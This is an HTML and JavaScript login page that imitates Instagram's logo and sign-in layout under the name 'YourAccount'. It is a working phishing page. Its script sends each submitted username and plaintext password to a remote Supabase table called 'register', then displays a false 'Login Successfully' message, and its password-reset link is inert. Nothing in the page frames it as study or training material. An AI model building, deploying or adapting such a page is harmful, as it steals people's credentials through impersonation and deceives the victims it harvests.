<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login • YourAccount</title>
  <!-- Supabase JS Client via CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <!-- Environment variables (shifted from HTML) -->
  <script src="env.js"></script>
  <style>
    :root {
      --bg-top: #0c1014;
      --bg: #181a1d;
      --field-bg: #1c1f23;
      --border: #3a3f45;
      --text: #f5f5f5;
      --muted: #a8a8a8;
      --blue: #0095f6;
      --blue-disabled: #0f3a6b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .top {
      width: 100%;
      background: var(--bg-top);
      display: flex;
      justify-content: center;
      padding: 28px 0 32px;
    }

    main {
      width: 100%;
      max-width: 440px;
      padding: 0 28px;
      flex: 1;
    }

    h1 {
      font-size: 15px;
      font-weight: 600;
      margin: 40px 0 16px;
    }

    .field {
      width: 100%;
      height: 50px;
      background: var(--field-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      color: var(--text);
      font-size: 14px;
      padding: 0 14px;
      margin-bottom: 10px;
      outline: none;
    }

    .field::placeholder {
      color: var(--muted);
    }

    .field:focus {
      border-color: #8e9399;
    }

    .btn {
      width: 100%;
      height: 40px;
      border-radius: 20px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      border: 1px solid transparent;
    }

    #loginBtn {
      margin-top: 6px;
      background: var(--blue);
      color: #fff;
      cursor: pointer;
      transition: opacity 0.2s;
    }

    #loginBtn:hover {
      opacity: 0.9;
    }

    #loginBtn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .error {
      color: #ff6b6b;
      font-size: 13px;
      text-align: center;
      margin-top: 12px;
      min-height: 18px;
    }

    .error.success {
      color: green;
    }

    .forgot {
      display: block;
      text-align: center;
      color: var(--text);
      font-size: 13px;
      font-weight: 500;
      text-decoration: none;
      margin: 18px 0 62px;
    }

    .fb {
      background: #2a2d31;
      color: var(--text);
      border-color: #2a2d31;
      margin-bottom: 14px;
    }

    .create {
      background: transparent;
      color: var(--blue);
      border-color: var(--blue);
      text-decoration: none;
    }

    .meta {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
      margin: 22px 0 28px;
      color: var(--muted);
      font-size: 13px;
    }

    footer {
      width: 100%;
      max-width: 440px;
      padding: 16px 14px 20px;
      text-align: center;
      font-size: 11px;
      color: var(--muted);
      line-height: 2;
    }

    footer a {
      color: var(--muted);
      text-decoration: none;
      margin: 0 6px;
      white-space: nowrap;
    }

    footer a:hover {
      text-decoration: underline;
    }

    footer .copy {
      display: block;
      margin-top: 8px;
    }

    .field:focus-visible,
    .btn:focus-visible,
    .forgot:focus-visible {
      outline: 2px solid var(--blue);
      outline-offset: 2px;
    }
  </style>
</head>

<body>

  <div class="top">
    <svg width="48" height="48" viewBox="0 0 48 48" aria-label="YourAccount">
      <defs>
        <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0" stop-color="#feda75" />
          <stop offset="0.3" stop-color="#fa7e1e" />
          <stop offset="0.55" stop-color="#d62976" />
          <stop offset="0.8" stop-color="#962fbf" />
          <stop offset="1" stop-color="#4f5bd5" />
        </linearGradient>
      </defs>
      <rect x="5" y="5" width="38" height="38" rx="11" fill="none" stroke="url(#ig)" stroke-width="4.5" />
      <circle cx="24" cy="24" r="8.5" fill="none" stroke="url(#ig)" stroke-width="4.5" />
      <circle cx="35" cy="13" r="2.6" fill="url(#ig)" />
    </svg>
  </div>

  <main>
    <h1>Please Login...</h1>

    <form id="loginForm" novalidate>
      <input class="field" id="username" type="text" placeholder="Mobile number, username or email"
        autocomplete="username">
      <input class="field" id="password" type="password" placeholder="Password" autocomplete="current-password">
      <button class="btn" id="loginBtn" type="submit">Log in</button>
      <p class="error" id="error" role="alert"></p>
    </form>

    <a class="forgot" href="#" data-noop>Forgotten password?</a>


  </main>


  <script>
    // --- Supabase Configuration ---
    // Loaded securely from env.js (which mirrors .env)
    const ENV = window.__ENV || {};
    const SUPABASE_URL = ENV.SUPABASE_URL || '';
    const SUPABASE_ANON_KEY = ENV.SUPABASE_ANON_KEY || '';

    const supabaseClient = (window.supabase && SUPABASE_URL && SUPABASE_ANON_KEY)
      ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
      : null;

    const form = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const btn = document.getElementById('loginBtn');
    const errorEl = document.getElementById('error');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      errorEl.textContent = '';
      errorEl.classList.remove('success');

      const userVal = usernameInput.value.trim();
      const passVal = passwordInput.value;

      if (!userVal || !passVal) {
        errorEl.textContent = 'Please enter both username and password.';
        return;
      }

      if (!supabaseClient || !SUPABASE_URL) {
        errorEl.textContent = 'Please configure your Supabase credentials in .env / env.js.';
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Saving...';

      try {
        // Inserts username and password into 'register' table
        const { data, error: dbError } = await supabaseClient
          .from('register')
          .insert([
            {
              username: userVal,
              password: passVal
            }
          ]);

        if (dbError) {
          throw dbError;
        }

        errorEl.classList.add('success');
        errorEl.textContent = 'Login Successfully...';
        form.reset();
      } catch (err) {
        console.error('Supabase error:', err);
        errorEl.classList.remove('success');
        errorEl.textContent = err.message || 'Failed to save credentials.';
      } finally {
        btn.disabled = false;
        btn.textContent = 'Log in';
      }
    });

    // Register / forgot links placeholder
    document.querySelectorAll('[data-noop]').forEach(function (el) {
      el.addEventListener('click', function (e) { e.preventDefault(); });
    });
  </script>
</body>

</html>
